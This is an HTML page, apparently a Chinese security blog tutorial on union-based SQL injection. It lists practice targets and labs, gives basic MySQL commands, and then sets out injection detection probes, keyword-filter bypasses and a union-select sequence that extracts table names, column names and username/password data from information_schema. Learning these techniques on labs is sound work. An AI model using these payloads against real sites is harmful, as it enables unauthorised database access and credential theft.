@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="description" content>
+    <meta name="author" content="John Doe">
+    <meta name="keywords" content>
+    <title>SQL注入第一节之Union联合注入 ~ Willburke-blogs</title>
+    <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css?v=5.7.2">
+    <link rel="stylesheet" href="/lib/mdbootstrap/css/bootstrap.min.css?v=4.3.1">
+    <link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css?v=4.8.7">
+    <link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_l7tuu6qerl9.css">
+    
+        <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+    
+    <link rel="stylesheet" href="/css/main.css">
+
+    
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+<div class="container">
+    <a class="navbar-brand" href="/"><strong>Willburke-blogs</strong></a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto text-center">
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/">Home</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/archives/">Archives</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/about/">About</a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+
+</nav>
+    <div class="view intro-2" style="background: url('/img/post.jpg')no-repeat center center;background-size: cover;">
+    <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+        <div class="container text-center white-text wow fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+            <br>
+            
+            <p>Tuesday, August 3rd 2021, 2:38 pm</p>
+            
+        </div>
+        </div>
+    </div>
+    </div>
+  </header>
+
+  <main>
+  
+  <link rel="stylesheet" href="/css/post.css">
+
+<div class="container-fluid">
+    <div class="row">
+        <div class="d-none d-md-block col-md-2"></div>
+        <div class="col-md-8 m-auto board-cntr">
+            <div class="py-5 z-depth-3 board">
+                <div class="post-content markdown-body m-auto">
+                    <h4 id="在线提供的渗透测试网站"><a href="#在线提供的渗透测试网站" class="headerlink" title="在线提供的渗透测试网站"></a>在线提供的渗透测试网站</h4><p><a href="http://demo.testfire.net/" target="_blank" rel="noopener">http://demo.testfire.net/</a>  ：由IBM提供的测试环境，作为测试自家弱点扫描工具（AppScan）之用</p>
+<p><a href="http://zero.webappsecurity.com/" target="_blank" rel="noopener">http://zero.webappsecurity.com/</a>    ：zeroBank是HP提供的测试网站，可作为Fortify’sWebInspect（web安全加固评估）的测试评估目标。</p>
+<p><a href="http://testasp.vulnweb.com/" target="_blank" rel="noopener">http://testasp.vulnweb.com/</a>   </p>
+<p><a href="http://testphp.vulnweb.com/" target="_blank" rel="noopener">http://testphp.vulnweb.com/</a>   </p>
+<p><a href="http://testaspnet.vulnweb.com/" target="_blank" rel="noopener">http://testaspnet.vulnweb.com/</a>  </p>
+<p>由Acunetix 提供的作为Acunetix黑箱程序的测试网站，分别针对ASP、PHP、ASP.NET 的程序设计。</p>
+<h4 id="线下靶场环境"><a href="#线下靶场环境" class="headerlink" title="线下靶场环境"></a>线下靶场环境</h4><p>DVWA（Damn Vulnerable Web Application）：使用PHP+mysql编写的漏洞检测平台</p>
+<p>sqli：专门用于做注入的一个平台100多关SQL注入测试平台</p>
+<p>web学习靶场源码</p>
+<p>DoraBox-master：哆啦盒练习实战平台</p>
+<h4 id="sql数据库语句"><a href="#sql数据库语句" class="headerlink" title="sql数据库语句"></a>sql数据库语句</h4><p>mysql&gt; show databases;  //查看所有数据库</p>
+<p>mysql&gt; use mysql;   //使用mysql数据库</p>
+<p>mysql&gt; show tbales;   //查看所有表</p>
+<p>mysql&gt; select * from user;   //查看表的字段及内容</p>
+<p>mysql&gt; select host,user,password from user;    //查看三个字段的内容</p>
+<p>mysql&gt; update user set host=(‘%’) where host=’172.0.0.1’;   //修改host里面的数据</p>
+<p>mysql&gt; flush privileges;  //刷新，才会生效</p>
+<p>information_schema  //mysql 5.0以上的版本，这个数据库保存了所有的数据库名，表名，字段名</p>
+<p>schemata                   //此表保存了所有的数据库名</p>
+<p>tables                         //此表保存了所有的表名</p>
+<p>columns                     //此表保存了所有的字段名</p>
+<p>table_schema  //此字段保存了所有表名</p>
+<p>table_name   //此字段保存了所有的</p>
+<p>limit的用法：</p>
+<p>• Limit的使用格式是limit m,n,其中m指的是记录开始的位置，从m=0开始，表示第一 条记录；n是指取几条记录。</p>
+<p>• 如：select * from guestbook.user limit 0,2; </p>
+<p>注释符号：</p>
+<p>1.#</p>
+<p>2.–[空格]</p>
+<p>3./* ……*/</p>
+<h4 id="SQL注入漏洞的探测方法"><a href="#SQL注入漏洞的探测方法" class="headerlink" title="SQL注入漏洞的探测方法"></a>SQL注入漏洞的探测方法</h4><p>可能存在注入漏洞的网站：</p>
+<p>http：//xxx.xxx.xxx/abc.asp?id=XX</p>
+<p>http：//xxx.xxx.xxx/abc.jsp?id=XX</p>
+<p>http：//xxx.xxx.xxx/abc.asps?id=XX</p>
+<p>整型判断方法：</p>
+<p>1.先在  ?id=XX’  ←后面加一撇   结果为异常</p>
+<p>2.在  ?id=XX and1=1  结果正常     ?id=XX and1=2  结果异常</p>
+<p>绕过的方法：</p>
+<p>/<em>！and</em>/  aanndd  AaNnDd   //过滤and</p>
+<p>字符串型判断方法：</p>
+<p>1.先在 ?username=XX’ ←后面加一瞥 结果为异常</p>
+<p>2.在  ?username=XX and’1’=’1’ 结果正常</p>
+<p>​        ?username=XX and’1’=’2’ 结果异常</p>
+<h4 id="Union注入攻击（联合查询）"><a href="#Union注入攻击（联合查询）" class="headerlink" title="Union注入攻击（联合查询）"></a>Union注入攻击（联合查询）</h4><p>1.判断是否存在注入点。【and1=1判断】</p>
+<p>2.通过 order by+数字 判断查询表的字段数量</p>
+<p>3.通过 union select 1,2,3,4……  判断字段数量</p>
+<p>4.在    union select 1,2,database(),4  查数据库名</p>
+<p>5.在    union select 1,2,(select group_concat(table_name) from information_schema.tables where TABLE_SCHEMA=’text’),4  爆出所有表名</p>
+<p>6.在    union select 1,2,(select group_concat(column_name) from information_schema.columns where TABLE_SCHEMA=’text’ and TABLE_NAME=’users’),4   爆出所有字段</p>
+<p>7.在    union select 1,2,(select group_concat(username,password) from users.text),4    爆出所有内容</p>
+
+                    <hr>
+                    <div>
+                        <p>
+                        
+                        </p>
+                    </div>
+                    <br>
+                    
+                </div>
+            </div>
+        </div>
+        <div class="d-none d-md-block col-md-2">
+            
+  <div id="toc" class="py-5">
+    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
+    <div id="tocbot"></div>
+  </div>
+
+        </div>
+    </div>
+</div>
+
+<!-- custom -->
+
+    <div class="custom">
+    <img src="/img/good.jpg" class="rounded mx-auto d-block mt-5" style="width:440px; height:280px;">
+    </div>
+
+
+<!-- Comments -->
+<div class="comments" id="comments">
+
+</div>
+  
+  </main>
+
+<footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/0x2e/Material-T" target="_blank" rel="nofollow noopener"> <b>Material-T</b></a>
+    <br>
+    
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">京ICP证56489355号</a>
+      
+        <a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=C3435685" target="_blank" rel="nofollow noopener"> | 京公网安备45213656号</a>
+      
+    
+  </div>
+</footer>
+
+  <!-- SCRIPTS -->
+  <script src="/lib/mdbootstrap/js/jquery-3.4.1.min.js"></script>
+  <script src="/lib/mdbootstrap/js/popper.min.js"></script>
+  <script src="/lib/mdbootstrap/js/bootstrap.min.js?v=4.3.1"></script>
+  <script src="/lib/mdbootstrap/js/mdb.min.js?v=4.8.7"></script>
+  <script src="/js/main.js"></script>
+  
+    
+      <script src="/lib/tocbot/tocbot.min.js?v=4.7.0"></script>
+    
+    <script src="/js/post.js"></script>
+  
+  
+    <script src="/lib/prettify/prettify.min.js?v=0.1.0"></script>
+    <script>
+      $(document).ready(function(){
+        $('pre').addClass('prettyprint linenums');
+        prettyPrint();
+      })
+    </script>
+  
+  
+    <script src="/lib/typed/typed.min.js?v=2.0.9"></script>
+    <script>
+        var typed = new Typed('#subtitle', {
+          strings: [
+            '  ',
+            "SQL注入第一节之Union联合注入&nbsp;",
+        ],
+        cursorChar: "_",
+        typeSpeed: 70,
+        startDelay: 300, //开始之前延迟300毫秒
+        loop: false,
+        });
+        $(".typed-cursor").addClass("h2");
+    </script>
+  
+  
+    <script src="/lib/anchor/anchor.min.js?v=4.2.0"></script>
+    <script>
+      anchors.options = {
+        placement: "right",
+        visible: "false",
+        
+      };
+      anchors.add(".post-content > h1,h2,h3,h4,h5,h6");
+    </script>
+  
+</body>
+</html>
